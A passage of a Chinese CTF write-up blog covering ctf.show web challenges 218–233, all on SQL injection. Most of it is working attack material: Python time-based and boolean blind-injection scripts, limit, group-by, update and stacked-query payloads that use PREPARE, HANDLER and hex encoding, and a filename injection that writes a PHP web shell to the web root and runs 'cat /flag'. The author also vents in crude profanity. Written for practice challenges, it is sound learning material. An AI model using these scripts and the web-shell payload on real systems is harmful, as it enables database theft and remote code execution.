#求表payload &#x3D; &quot;1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,(&#123;&#125;),0)#&quot;
#payload &#x3D; &quot;1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagxc&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,(&#123;&#125;),0)#&quot;
payload &#x3D; &quot;1) and  if(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,(&#123;&#125;),0)#&quot;


n &#x3D; 0

for i in range(0, 666):
    for j in str:
        data &#x3D; &#123;
            &quot;ip&quot;: payload.format(i,j,bypass),
            &quot;debug&quot;: &#39;0&#39;
        &#125;
        start &#x3D; time.time()
        res &#x3D; requests.post(url, data)
        end &#x3D; time.time()
        if end - start &gt; 0.4 and end - start &lt; 1:
            flag +&#x3D; j
            n +&#x3D; 1
            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))
            print(flag)
            if j &#x3D;&#x3D; &quot;&#125;&quot;:
                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))
                exit()
            break</code></pre>
<h1 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h1><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;查询语句
where id &#x3D; ($id);
&#x2F;&#x2F;屏蔽危险分子
function waf($str)&#123;
    return preg_match(&#39;&#x2F;sleep|benchmark|rlike&#x2F;i&#39;,$str);
&#125; </code></pre>
<p>同上题<br>直接跑就行。</p>
<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL时间盲注1.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None
&quot;&quot;&quot;
import time

import requests

url &#x3D; r&#39;http:&#x2F;&#x2F;6c19b909-06f4-412b-ba28-581287b784fc.challenge.ctf.show&#x2F;api&#x2F;&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str &#x3D; &quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;
# inside &#x3D; &#39;database()&#39;
# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;
# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxca&quot;&#39;
inside &#x3D; &#39;substr((select group_concat(flagaabc) from ctfshow_flagxca),9,36)&#39;

payload &#x3D; &quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;
res &#x3D; &#39;&#39;
last &#x3D; &#39; &#39;

for i in range(1, 100):
    for j in str:
        data &#x3D; &#123;
            &#39;ip&#39;: payload.format(inside, i, j),
            &#39;debug&#39;: 0
        &#125;
        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
        except Exception as e:
            last &#x3D; res
            res +&#x3D; j
            break
        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):
            exit()
        time.sleep(1)
    print(res)</code></pre>
<h1 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h1><p>最后一个盲注了，赶紧做完赶紧润。<br>过滤了substr，可以用正则，left都可以。用limit代替group_concat() </p>
<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL时间盲注2.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;14 13:25   natro92      1.0         None
&quot;&quot;&quot;
import time

import requests

url &#x3D; r&#39;http:&#x2F;&#x2F;2db91241-b5ab-4eec-9035-df2df4f18a46.challenge.ctf.show&#x2F;api&#x2F;&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str &#x3D; &quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;
# inside &#x3D; &#39;database()&#39;
# inside &#x3D; &#39;select table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1&#39;
# inside &#x3D; &#39;select column_name from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxcac&quot; limit 1,1&#39;
inside &#x3D; &#39;select flagaabcc from ctfshow_flagxcac&#39;

payload &#x3D; &quot;1) or if(left((&#123;&#125;),&#123;&#125;)&#x3D;(&#39;&#123;&#125;&#39;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;
res &#x3D; &#39;&#39;
last &#x3D; &#39; &#39;
for i in range(1, 100):
    for j in str:
        data &#x3D; &#123;
            &#39;ip&#39;: payload.format(inside, i, res + j),
            &#39;debug&#39;: 0
        &#125;
        try:
            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)
        except Exception as e:
            last &#x3D; res
            res +&#x3D; j
            break
        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):
            exit()
        time.sleep(1)
    print(res)</code></pre>


<p>其他脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"># -- coding:UTF-8 --
# Author:孤桜懶契
# Date:2021&#x2F;8&#x2F;1
# blog: gylq.gitee.io
import requests
import time
bypass&#x3D;&quot;select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f&quot;
url &#x3D; &quot;http:&#x2F;&#x2F;d82b1a0b-aba4-4fed-aa83-62d59d7df4ee.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;
flag &#x3D; &quot;&quot;
#1) and if((database())regexp(&#39;^ctfshow&#39;),(select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f),0)#
#payload &#x3D; &quot;1) and if((database())regexp(&#39;^&#123;&#125;&#39;),(&#123;&#125;),0)#&quot;
#payload &#x3D; &quot;1) and if((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)regexp(&#39;^&#123;&#125;&#39;),(&#123;&#125;),0)#&quot;
#payload &#x3D; &quot;1) and if((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagxcac&#39; limit 1,1)regexp(&#39;^&#123;&#125;&#39;),(&#123;&#125;),0)#&quot;
payload &#x3D; &quot;1) and if((select flagaabcc from ctfshow_flagxcac limit 0,1)regexp(&#39;^&#123;&#125;&#39;),(&#123;&#125;),0)#&quot;



n &#x3D; 0

for i in range(0, 666):
    for j in str:
        data &#x3D; &#123;
            &quot;ip&quot;: payload.format(flag + j,bypass),
            &quot;debug&quot;: &#39;0&#39;
        &#125;
        start &#x3D; time.time()
        res &#x3D; requests.post(url, data)
        end &#x3D; time.time()
        if end - start &gt; 3 and end - start &lt; 5:
            flag +&#x3D; j
            n +&#x3D; 1
            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))
            print(flag)
            if j &#x3D;&#x3D; &quot;&#125;&quot;:
                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))
                exit()
            break</code></pre>
<h1 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/99980.htm"><strong>https://www.jb51.net/article/99980.htm</strong></a></p>
</blockquote>
<h3 id="limit注入-MySQL利用procedure-analyse-函数优化表结构-这个题本质就是报错注入"><a href="#limit注入-MySQL利用procedure-analyse-函数优化表结构-这个题本质就是报错注入" class="headerlink" title="limit注入 MySQL利用procedure analyse()函数优化表结构 这个题本质就是报错注入"></a>limit注入 MySQL利用procedure analyse()函数优化表结构 这个题本质就是报错注入</h3><pre class="language-python" data-language="python"><code class="language-python">$sql &#x3D; select * from ctfshow_user limit ($page-1)*$limit,$limit;</code></pre>
<p>注入点在get处，limit注入使用标准：<br><code>select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code><br>修改为payload：</p>
<pre class="language-python" data-language="python"><code class="language-python">?page&#x3D;1&amp;limit&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689329494340-363ae1db-f3a1-4694-9bad-d0ec6cc660b7.png" alt="image.png"><br>直接交数据库名即可</p>
<h1 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h1><h3 id="group-by注入"><a href="#group-by注入" class="headerlink" title="group by注入"></a>group by注入</h3><p>直接在group by的位置注入即可</p>
<pre class="language-python" data-language="python"><code class="language-python">form.on(&#39;submit(*)&#39;, function(data)&#123;
    var table &#x3D; layui.table;
    table.reload(&#39;user_table&#39;, &#123;
      url:&#39;api&#x2F;?u&#x3D;username&#39;
    &#125;)
    return false; 
  &#125;);

  $sql &#x3D; select * from ctfshow_user group by $username;</code></pre>
<p>直接用时间盲注即可：<br>测试时会发现sleep的值会被方法二十倍。<br><code>?u=sleep(0.5)</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689331879814-ce852ff0-cdee-4a48-9eda-66304003d4b5.png" alt="image.png"><br>然后就使用之前的时间盲注脚本即可。</p>
<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL时间盲注1.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None
&quot;&quot;&quot;
import time

import requests

url &#x3D; r&#39;http:&#x2F;&#x2F;0750fdff-bead-49bc-b6cb-501f23e1457d.challenge.ctf.show&#x2F;api&#x2F;?u&#x3D;&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str &#x3D; &quot;_abcdefghijklmnopqrstuvwxyz0123456789,&#123;-&#125; &quot;
# inside &#x3D; &#39;database()&#39;
# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;
# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flaga&quot;&#39;
inside &#x3D; &#39;substr((select group_concat(flagaabc) from ctfshow_flaga),1,48)&#39;
payload &#x3D; &quot;if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),sleep(0.05),1)&quot;
res &#x3D; &#39;&#39;
last &#x3D; &#39; &#39;

for i in range(1, 100):
    for j in str:
        try:
            r &#x3D; requests.post(url&#x3D;url + payload.format(inside, i, j), timeout&#x3D;1)
        except Exception as e:
            last &#x3D; res
            res +&#x3D; j
            break
        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):
            exit()
    print(res)</code></pre>
<h1 id="web223（勾吧题，做破防了）"><a href="#web223（勾吧题，做破防了）" class="headerlink" title="web223（勾吧题，做破防了）"></a>web223（勾吧题，做破防了）</h1><p>提示用户名不能用数字，因此可以用true代替，但是用true的代价就是一次循环20s，那就用布尔盲注代替。<br>看了wp发现使用的非常巧妙：<br>exp</p>
<pre class="language-python" data-language="python"><code class="language-python">if(true,username,false)</code></pre>
<p>如果返回true时，就会执行<code>group by username</code>，导致参数变多：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334070399-917c5ad2-3dc9-4c8b-b024-ab234ed78616.png" alt="image.png"><br>而false时，返回false字符串，数据就相对较少：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334102676-c0d798b5-618c-4450-98f9-f1ee4247ba16.png" alt="image.png"><br>因此可以做出盲注，构建脚本:<br>注意，这里过滤了数字1，因此只能用true代替。<br>给我杀了把 傻逼题，勾吧脚本真不知道哪错了：（这个脚本出不来，但是真不想改了）</p>
<pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-
&quot;&quot;&quot;
@File    :   SQL布尔盲注3.py   
@Contact :   2997453446@qq.com
@Blog    :   natro92.github.io
 
@Modify Time      @Author    @Version    @Desciption
------------      -------    --------    -----------
2023&#x2F;7&#x2F;14 19:29   natro92      1.0         None
&quot;&quot;&quot;

import string
import requests
import time

def calculate_true(num):
    res &#x3D; &#39;true&#39;
    res +&#x3D; (num - 1) * &#39;+true&#39;
    # print(res)
    return res

def checkNum(s):
    if s in string.ascii_lowercase:
        return s
    elif s in &#39;0123456789&#39;:
        return calculate_true(int(s))
    else:
        return None

url &#x3D; r&#39;http:&#x2F;&#x2F;364e23b2-79ce-4183-a604-8d8d1666bd18.challenge.ctf.show&#x2F;api&#x2F;?u&#x3D;&#39;
flag_pre &#x3D; &#39;ctfshow&#123;&#39;
str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;
inside &#x3D; &quot;database()&quot;
# inside &#x3D; &quot;admin&#39;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
# inside &#x3D; &quot;admin&#39;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
# inside &#x3D; &quot;admin&#39;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;
payload &#x3D; &#39;if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&quot;&#123;&#125;&quot;),username,false)&#39;
res &#x3D; &#39;&#39;
for i in range(1,100):
    for j in str1:
        nurl &#x3D; url
        nurl +&#x3D; payload.format(inside, calculate_true(i), checkNum(j)).replace(&#39;1&#39;, &#39;true&#39;) # 1被过滤了，别忘了
        r &#x3D; requests.post(nurl)
        # print(data)
        # print(r.json()[&#39;msg&#39;])
        # print(nurl)
        # print(r.text)
        if &#39;AUTO&#39; in r.text:
            res +&#x3D; j
            print(res)
            if j &#x3D;&#x3D; &#39;&#125;&#39;:
                exit()</code></pre>
<p>看看远处的正确脚本吧：</p>
<pre class="language-python" data-language="python"><code class="language-python">import requests
import time
url &#x3D; &#39;http:&#x2F;&#x2F;90b8ab81-6a05-4ebc-ab88-62e8442c0e89.challenge.ctf.show&#x2F;api&#x2F;?u&#x3D;&#39;
str &#x3D; &#39;&#39;
def num2true(num):
    str &#x3D; &#39;(&#39; + &#39;true%2b&#39; * (num-1) + &#39;true)&#39;
    return str
a &#x3D; num2true(1)
# print(a)
for i in range(1, 60):
    min,max &#x3D; 32, 128
    while True:
        j &#x3D; min + (max-min)&#x2F;&#x2F;2
        if(min &#x3D;&#x3D; j):
            str +&#x3D; chr(j)
            print(str)
            break
        # 爆表名
        # payload &#x3D; f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;
        # 爆列
        # payload &#x3D; f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagas&#39;),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;
        # 爆值
        payload &#x3D; f&quot;if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;
        r &#x3D; requests.get(url&#x3D;url+payload).text
        # print(r)
        if &#39;passwordAUTO&#39; in r:
            max &#x3D; j
        else:
            min &#x3D; j
</code></pre>
<pre class="language-python" data-language="python"><code class="language-python"># -- coding:UTF-8 --
# Author:孤桜懶契
# Date:2021&#x2F;8&#x2F;1
# blog: gylq.gitee.io
import requests
#import time

def generateNum(num):
    res &#x3D; &#39;true&#39;
    if num &#x3D;&#x3D; 1:
        return res
    else:
        for i in range(num-1):
            res +&#x3D; &quot;+true&quot;
        return res


url &#x3D; &quot;http:&#x2F;&#x2F;ce009cf2-8652-4737-ba07-b3bfc3bc3a4a.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;
str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;
flag &#x3D; &quot;&quot;

#*************************************************************************************************************************************************************
#--------查表
#sql&#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;
#--------查字段
#sql&#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagas&#39;&quot;
#--------查flag
sql&#x3D; &quot;select flagasabc from ctfshow_flagas&quot;
#*************************************************************************************************************************************************************
payload &#x3D; &quot;if(ascii(substr((&#123;&#125;),&#123;&#125;,true))&#x3D;(&#123;&#125;),username,false)&quot;


#计数
n &#x3D; 0

for i in range(1, 666):
    for j in range(32,126):
        result_num&#x3D;generateNum(i)
        result&#x3D;generateNum(j)
        params &#x3D; &#123;
            &#39;u&#39; : payload.format(sql,result_num,result)
        &#125;

        res &#x3D; requests.get(url &#x3D; url, params &#x3D; params)
        if &quot;userAUTO&quot; in res.text:
            flag +&#x3D; chr(j)
            n +&#x3D; 1
            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))
            print(flag)
            if j &#x3D;&#x3D; &quot;&#125;&quot;:
                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))
                exit()
            break
#ctfshow&#123;728dd1b0-7547-401d-b358-2d2207f3d13c&#125;
</code></pre>
<p>太重量级了，我拼个半天那个测试payload就是不对，true拼接咋拼咋不对，草泥马，傻逼sql注入你妈妈死了。<br>不用asci拼到substr里就是不行。</p>
<pre class="language-python" data-language="python"><code class="language-python">&#x2F;api&#x2F;?u&#x3D;if(substr((database()),(true),true)&#x3D;(&#39;c&#39;),username,&#39;a&#39;)</code></pre>
<p>第一个就行<br>第二个就不行</p>
<pre class="language-python" data-language="python"><code class="language-python">http:&#x2F;&#x2F;000cd6ed-c9e2-47c0-8f98-045fe552c6cd.challenge.ctf.show&#x2F;api&#x2F;?u&#x3D;if(mid((database()),(true+true),(true))&#x3D;(&#39;c&#39;),username,&#39;a&#39;)</code></pre>
<h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p>似乎不是sql注入，而是文件上传。<br> 实际上robots.txt能扫出来有修改密码的位置，修改密码之后登录是一个文件上传。<img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690440405918-9387ad36-0b95-4e7a-8698-b57c6f13a676.png" alt="20201128094552251.png"><br>文件名注入，写入文件：</p>
<pre class="language-php" data-language="php"><code class="language-php">C64File &quot;&#39;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;; --+</code></pre>
<p>保存为：<code>payload.bin</code>其中十六进制为：<code>&lt;?=``$_GET[1]?``&gt;</code>，然后访问1.php传参1RCE。</p>
<pre class="language-php" data-language="php"><code class="language-php">&#x2F;1.php?1&#x3D;cat &#x2F;flag</code></pre>
<h1 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h1><h3 id="handler，预处理"><a href="#handler，预处理" class="headerlink" title="handler，预处理"></a>handler，预处理</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/107823398">https://blog.csdn.net/solitudi/article/details/107823398</a><br><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a> handler官方文档</p>
</blockquote>
<p>没过滤show字符：<code>ctfshow&#39;;show tables;</code></p>
<pre class="language-php" data-language="php"><code class="language-php">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;,&#123;&quot;Tables_in_ctfshow_web&quot;:&quot;ctfshow_flagasa&quot;&#125;,&#123;&quot;Tables_in_ctfshow_web&quot;:&quot;ctfshow_user&quot;&#125;]&#125;</code></pre>
<p>用handler读取：<code>username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</code></p>
<pre class="language-php" data-language="php"><code class="language-php">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;,&#123;&quot;id&quot;:&quot;1&quot;,&quot;flagas&quot;:&quot;ctfshow&#123;83599e7a-ba35-4ce6-88a1-6e1c69755ccb&#125;&quot;,&quot;info&quot;:&quot;you get it&quot;&#125;]&#125;</code></pre>
<h2 id="至于什么是handler："><a href="#至于什么是handler：" class="headerlink" title="至于什么是handler："></a>至于什么是handler：</h2><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭，使用方法：</p>
<pre class="language-php" data-language="php"><code class="language-php">&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first#</code></pre>
<h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。</p>
<pre class="language-php" data-language="php"><code class="language-php">PREPARE name from &#39;[my sql sequece]&#39;;   &#x2F;&#x2F;预定义SQL语句
EXECUTE name;  &#x2F;&#x2F;执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;  &#x2F;&#x2F;删除预定义SQL        语句</code></pre>
<p>字符串预处理：</p>
<pre class="language-php" data-language="php"><code class="language-php">PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;
ET @a &#x3D; 3;
SET @b &#x3D; 4;                                                   
EXECUTE stmt1 USING @a, @b;</code></pre>
<p>变量定义预处理：</p>
<pre class="language-php" data-language="php"><code class="language-php">SET @s &#x3D; &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;
PREPARE stmt2 FROM @s;
SET @c &#x3D; 6;
ET @d &#x3D; 8;
EXECUTE stmt2 USING @c, @d;
DEALLOCATE PREPARE stmt2;</code></pre>
<p>利用concat绕过过滤，然后将后面的database()替换为需要执行的语句。别忘记中间的空格。<br>payload：</p>
<pre class="language-php" data-language="php"><code class="language-php">?username&#x3D;ctfshow&#39;;PREPARE aaa from concat(&#39;s&#39;,&#39;elect&#39;, &#39; flagas from ctfshow_flagasa&#39;);EXECUTE aaa;</code></pre>
<p>或者用concat得到的连接字符也可以代替select：</p>
<pre class="language-php" data-language="php"><code class="language-php">?username&#x3D;ctfshow&#39;;PREPARE aaa from concat(char(115,101,108,101,99,116), &#39; flagas from ctfshow_flagasa&#39;);EXECUTE aaa;</code></pre>
<h1 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h1><p>我们之前在web224中的文件上传就使用了转换为十六进制然后将内容前加上0x。再加上预处理。<br>十六进制转换可以这样写：</p>
<pre class="language-php" data-language="php"><code class="language-php">text &#x3D; &quot;Hello World&quot;

hex_str &#x3D; &#39;&#39;
for ch in text:
    hex_ch &#x3D; hex(ord(ch)).replace(&#39;0x&#39;,&#39;&#39;)
    hex_str +&#x3D; hex_ch

print(&quot;原文：\n&quot;+text)
print(&quot;十六进制（不带0x）：\n&quot;+hex_str)
print(&quot;十六进制（带0x）：\n&quot;+&quot;0x&quot;+hex_str)</code></pre>
<p>我们将需要预编译的语句转换为十六进制。然后再传入比如：<br>show被过滤掉了，不要出现。</p>
<pre class="language-php" data-language="php"><code class="language-php">十六进制前：
select database()
转换后：
0x73656c6563742064617461626173652829
加上预编译语句：
ctf&#39;;PREPARE aaa from 0x73656c6563742064617461626173652829;EXECUTE aaa;--+</code></pre>
<p>然后再将中间的内容转换为需要的查询语句即可。<br>比如：</p>
<pre class="language-php" data-language="php"><code class="language-php">select table_name from information_schema.tables where table_schema&#x3D;database()
?username&#x3D;ctf&#39;;PREPARE aaa from 0x73656c656374207461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE aaa;--+</code></pre>
<p>查列</p>
<pre class="language-php" data-language="php"><code class="language-php">select column_name from information_schema.columns where table_name&#x3D;&#39;ctfsh_ow_flagas&#39;
?username&#x3D;ctf&#39;;PREPARE aaa from 0x73656c65637420636f6c756d6e5f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE aaa;--+</code></pre>
<p>查内容</p>
<pre class="language-php" data-language="php"><code class="language-php">select flagasb from ctfsh_ow_flagas
?username&#x3D;ctf&#39;;PREPARE aaa from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE aaa;--+</code></pre>
<p>就能查到flag了。</p>
<h1 id="web227、web228-web230"><a href="#web227、web228-web230" class="headerlink" title="web227、web228-web230"></a>web227、web228-web230</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079">https://blog.csdn.net/qq_41573234&#x2F;article&#x2F;details&#x2F;80411079</a></p>
</blockquote>
<p>他这里定义了自定义函数，所以需要去查询：<code>information_schema.Routines</code>这个：<br>其中的getFlag函数会调用flag 。也就是说直接<code>1&#39;;call getflag()</code>也可以<br>但其实这里已经显示出了flag：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690450427521-41d6da19-84df-4400-932d-8186fd04e438.png" alt="image.png"></p>
<h1 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h1><h3 id="update盲注"><a href="#update盲注" class="headerlink" title="update盲注"></a>update盲注</h3><p>这里需要开出来两个页面，一个负责修改（<code>/api/</code>），一个负责查看（<code>/update.php</code>）。直接修改内容，<br>比如在修改页面中传参：</p>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;,username&#x3D;database() where 1&#x3D;1#&amp;username&#x3D;1</code></pre>
<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461441854-8098f695-7156-4f77-a11f-4b87bc4fd815.png" alt="image.png"><br>运行之后返回查看页面发现被更新了：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690461474262-de625929-36e1-4802-b43b-a5f9fffc57d3.png" alt="image.png"><br>然后就依次插入查询语句：</p>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) where 1&#x3D;1#&amp;username&#x3D;1
banlist,ctfshow_user,flaga</code></pre>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;) where 1&#x3D;1#&amp;username&#x3D;1
id,flagas,info</code></pre>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;,username&#x3D;(select flagas from flaga) where 1&#x3D;1#&amp;username&#x3D;1
ctfshow&#123;bda6ff95-49e5-4832-98ef-5f2156f74200&#125;</code></pre>
<h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p>这个遇上一个的差别就是多个md5的括号需要闭合。</p>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;),username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) where 1&#x3D;1#&amp;username&#x3D;1
banlist,ctfshow_user,flagaa</code></pre>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;),username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flagaa&#39;) where 1&#x3D;1#&amp;username&#x3D;1
id,flagass,info</code></pre>
<pre class="language-php" data-language="php"><code class="language-php">password&#x3D;1&#39;),username&#x3D;(select flagass from flagaa) where 1&#x3D;1#&amp;username&#x3D;1
ctfshow&#123;d980485f-5f60-4558-a646-0c538bc3b9a1&#125;</code></pre>
<h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><p>盲注python。</p>
